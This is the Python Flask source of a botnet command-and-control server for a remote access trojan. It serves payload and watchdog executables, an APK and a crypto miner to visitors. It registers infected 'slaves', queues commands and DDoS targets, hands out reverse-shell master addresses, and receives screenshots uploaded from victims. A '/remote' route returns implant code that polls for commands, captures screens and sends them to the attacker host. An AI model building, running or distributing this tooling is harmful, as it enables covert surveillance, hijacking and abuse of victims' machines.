from flask import request, render_template
from flask import Flask , request, redirect, render_template , sessions, session, url_for, send_from_directory, send_file
from flask_cors import CORS, cross_origin
from werkzeug.utils import secure_filename
from werkzeug.datastructures import  FileStorage
import flask
import os
import sqlite3
import apext_db
import nuitka
from datetime import date

app = Flask(__name__, static_folder='static')
CORS(app=app, supports_credentials=True)
app.config['SCREENSHOT_FOLDER'] = "./static/screenshots"
app.secret_key= os.urandom(24).hex()

_SERVER = "192.168.1.6:3000"
ip = '192.168.1.6'
port = '3000'

#   HOME LINK WILL DETECT WHAT OS THE VISITOR IS RUNNING AND SEND INFECTED FILE ACCORDINGLY  #
@app.route('/admin')
def mainn():
    rats = []
    for rat in apext_db.get_rat_list():
        print(rat)
        rats.append(rat)
    return render_template("admin.html", rats=rats)

### LINUX PAYLOAD AND WATHCDOG ###
@app.route('/downloads/linux/watchdog')
def download_linux_watchdog():
    print(request.user_agent.string)
    return send_file('./static/linux/watchdog', as_attachment=True)

@app.route('/downloads/linux/payload')
def download_linux_payload():
    print(request.user_agent.string)
    return send_file('./static/linux/payload', as_attachment=True)

@app.route('/android')
def download_linzzux_payload():
    print(request.user_agent.string)
    return send_file("./static/linux/zz.apk", as_attachment=True)

### WINDOWS PAYLOAD AND WATCHDOG ###
@app.route('/downloads/windows/watchdog')
def download_windows_watchdog():
    print(request.user_agent.string)
    return send_file('./static/windows/watchdog.exe', as_attachment=True)

@app.route('/downloads/windows/payload')
def download_windows_payload():
    print(request.user_agent.string)
    return send_file('./static/windows/payload.exe', as_attachment=True)

### DOWNLOAD MINERS ###
@app.route('/downloads/linux/phoenixminer')
def download_linux_phoenixminer():
    print(request.user_agent.string)
    return send_file('./static/linux/PhoenixMiner_5.7b_Linux.zip', as_attachment=True)

@app.route('/downloads/windows/phoenixminer')
def download_windows_phoenixminer():
    print(request.user_agent.string)
    return send_file('./static/linux/payload', as_attachment=True)

@app.route('/downloads/source-code')
def download_windows_phoenixminerz():
    print(request.user_agent.string)
    return send_file('./static/source-code/watchdog.py', as_attachment=True)

@app.route('/downloads/pu')
def download_windowss_phoenixminerz():
    print(request.user_agent.string)
    return send_file('./static/pu.jpeg', as_attachment=True)

###   LINK TO REGISTER SLAVE, SLAVES WILL BE REDIRECTED TO THIS LINK  ###
@app.route('/register/<ip>/<user>/<os>', methods=['POST', 'GET'])
def register(ip, user, os):
    if ip == "None":
        return "None"
    else:
        print(ip + ' ' + user + ' ' + os)
        today = date.today()
        _REGISTERED_DATE = today.strftime("%m/%d/%y")
        _LAST_SEEN_DATE = today.strftime("%m/%d/%y")
        apext_db.register(ip, user, os, _REGISTERED_DATE, _LAST_SEEN_DATE)
        print('created users')
        return 'none'

###   LINK TO CHECK IF RAT HAS BEEN REGISTERED, IF NOT IT WILL REDIRECT TO REGISTRATION LINK  ###
@app.route('/check_if_registered/<ip>/<user>', methods=['POST', 'GET'])
def check_if_registered(ip, user):
    print('checking if user is registered alrdy')
    try:
        if ip == "None":
            return 0
        if apext_db.check_rat_exists(ip, user) != None:
            print('he exists')
            print(request.remote_addr)
            return 'True'
        else:
            return 'False'

    except TypeError:
        return redirect(register(ip, user))

### LINK FOR SLAVE TO CHECK FOR NEXT COMMAND. COMMANDS WILL EMPTY AFTER ATTEMPT, PIPING COMMANDS DO NOT WORK YET  ###
@app.route('/command/<ip>/<user>', methods=['POST', 'GET'])
def command(ip, user): 
    command = '{0}'.format(apext_db.get_user_command(ip, user))
    apext_db.remove_user_command(ip, user)
    print(command)
    return command

#   IP AND PORT TO DDOS WITH ALL SLAVES #
@app.route('/mass/<ip>/<user>', methods=['POST', 'GET'])
def mass_(ip, user): 
    command = '{0}'.format(apext_db.get_user_command(ip, user))
    apext_db.remove_user_command(ip, user)
    print(command)
    return command

### IP AND PORT OF THE MASTER TO CONNECT REVERSE SHELL TO  ###
@app.route('/rshell/<ip>/<user>', methods=['POST', 'GET'])
def rshell_(ip, user): 
    master_ip = '{0}'.format(apext_db.get_rshell_master(ip, user))
    return master_ip

@app.route('/getip', methods=['POST', 'GET'])
def get_ip(): 
    return str(request.remote_addr)

#################################################
def check_token(key):
    print(key)
    f = open('tokens', 'r')
    token_list = []
    for token in f.readlines():
        token_list.append(token[:-1])
        f.close()
    print(token_list)
    if key in token_list:
        print('yup')
        return 1
    else:
        return 0

### once the link is clicked the link will no longer be avail ###
@app.route('/inf/<key>', methods=['GET']) 
def information_grabber(key):
    if check_token(key) == 1:
        ### remove token code here ####
        f = open('tokens', 'r')
        token_list = []
        for token in f.readlines():
            token_list.append(token[:-1])
            f.close()
        for token in token_list:
            if token == key:
                token_list.remove(token)
        os.remove("./tokens")
        f = open('tokens', 'a')
        for token in token_list:
            f.write('{0}\n'.format(token))
        f.close()
        print(token_list)
        
        ### infor grabber code here ###
        return 'something'
    else:
        return 'nothing'
################################################################


### UPLOAD FILES ###
@app.route('/upload/screenshot/<ip>/<user>', methods=['POST', 'GET'])
def upload_screenshot(ip, user): 
    if request.method == 'POST':
        try:

            if apext_db.check_rat_exists(ip, user) != None:
                print("screenshot user exists")
                f = request.files['file']
                
                filename = secure_filename(f.filename)
                f.save(os.path.join(app.config['SCREENSHOT_FOLDER'], filename))
                return 'ok'
                
                
            else:
                print("no user zzzzzzzzzzzzzzz")
                return None
        except Exception as e:
            print(e)
    if request.method == 'GET':

        return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>iMakeYouWear</title>
<meta name="description" content="">
<meta name="author" content="">

<body>
    <form name="upload" action = "http://{0}/upload/screenshot/{1}/{2}" method = "POST" 
       enctype = "multipart/form-data">
       <input type = "file" name = "file" />
       <input type = "submit"/>
    </form>   
 </body>
</html>
""".format("192.168.1.6:3000", "192.168.1.6", user )

###  GET IFRAME OF FILE SYSTEM ###
@app.route('/iframe', methods=['GET'])
def get_iframe():
    return """<!DOCTYPE html>
<html>
<body>

<script>
navigator.geolocation.getCurrentPosition((loc) => {
  console.log('The location in lat lon format is: [', loc.coords.latitude, ',', loc.coords.longitude, ']');
})
</script>

</body>
</html>

"""

@app.route('/remote', methods=['GET'])

def remote():
    return """
def register():
    try:
        requests.get(_REG_URL + '/{0}/{1}/{2}'.format(_MY_IP, username, _OS))
    except Exception as e:
        pass

#   CHECK IF RAT IS ALREADY REGISTERED  #
def chk_register():
    try:
        if requests.get(_CHECK_IF_REGISTERED + '/{0}/{1}'.format(_MY_IP, username)).content.decode('utf8') == 'True':
            return 1
        else:
            return 0
    except requests.exceptions.ConnectionError as e:
        
        pass

def upload_screenshot(SCREENSHOT):
        try:
            
            with open(SCREENSHOT, "rb") as f:
                requests.post("http://{0}/upload/screenshot/{1}/{2}".format(_WEB_SERVER, _MY_IP, username ), files={"file": f})
            
        except Exception as e:
            pass
        
def wait_for_command():
    try:
        time.sleep(random.randrange(5, 15))
        command = requests.get(_CHECK_FOR_COMMAND + '/{0}/{1}'.format(_MY_IP, username)).content.decode('utf8')
        if command == ' ':
            pass
        
        if command == "screenshot":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                now = datetime.datetime.now() # current date and time
                date_time = now.strftime("%H_%M_%S")

                _SCREEN_SHOT = pyautogui.screenshot()
                _SCREEN_SHOT.save(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
                upload_screenshot(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
                os.remove(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))

        if command == "reboot":
            if _OS == "Linux":
                subprocess.call("reboot")

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

        
        if command == "record":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                pass


        if command == "reboot":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

        if command == "killswitch":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

    except requests.exceptions.ConnectionError:
        pass
    except FileNotFoundError:
        pass
   
def exec_command(command):
    cmd = shlex.split(command)
    subprocess.call(cmd)

username = getpass.getuser()
if username == 'root':
    root = 1

while 1:
    if chk_register() == 1:
        if _RSHELL_OPT == 1:
                
                timer = threading.Timer(60, _RSHELL_OPT_)
                timer.start()
        while 1:
               #threading.Thread(target=_RSHELL_OPT_).start()
            wait_for_command()
            
    else:
        register()
        continue 

    
"""

app.run(host=ip, port=port, threaded=True)
